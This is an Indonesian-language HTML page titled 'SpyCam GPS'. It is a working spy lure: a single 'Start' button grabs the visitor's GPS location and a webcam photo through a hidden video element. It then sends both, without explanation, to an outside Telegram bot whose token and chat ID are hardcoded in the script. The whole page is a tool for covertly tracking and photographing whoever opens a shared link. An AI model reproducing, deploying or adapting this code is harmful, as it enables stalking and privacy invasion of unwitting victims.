<!DOCTYPE html>
<html>
<head>
  <title>SpyCam GPS</title>
</head>
<body>
  <h3 id="status">Klik tombol untuk mulai</h3>
  <button onclick="start()">Mulai</button>
  <video id="video" autoplay muted playsinline style="display:none;"></video>

<script>
const BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
const CHAT_ID = "7218964278";
const video = document.getElementById('video');
const statusText = document.getElementById('status');

async function sendToTelegram(photoData, lokasi) {
  // Kirim lokasi
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `Lokasi: ${lokasi}`
    })
  });

  // Kirim foto
  const blob = await (await fetch(photoData)).blob();
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, "photo.png");

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}

async function start() {
  statusText.textContent = "Meminta izin lokasi & kamera...";
  let lokasi = "Lokasi tidak tersedia";
  let foto = null;

  // Ambil lokasi
  try {
    await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition((pos) => {
        lokasi = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
        resolve();
      }, reject);
    });
  } catch {}

  // Akses kamera
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await new Promise(resolve => video.onloadedmetadata = resolve);
    await new Promise(resolve => setTimeout(resolve, 2000));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    foto = canvas.toDataURL("image/png");
    stream.getTracks().forEach(track => track.stop());
  } catch {}

  statusText.textContent = "Mengirim ke Telegram...";
  await sendToTelegram(foto, lokasi);
  statusText.textContent = "Selesai. Data terkirim ke Telegram.";
}
</script>
</body>
</html>
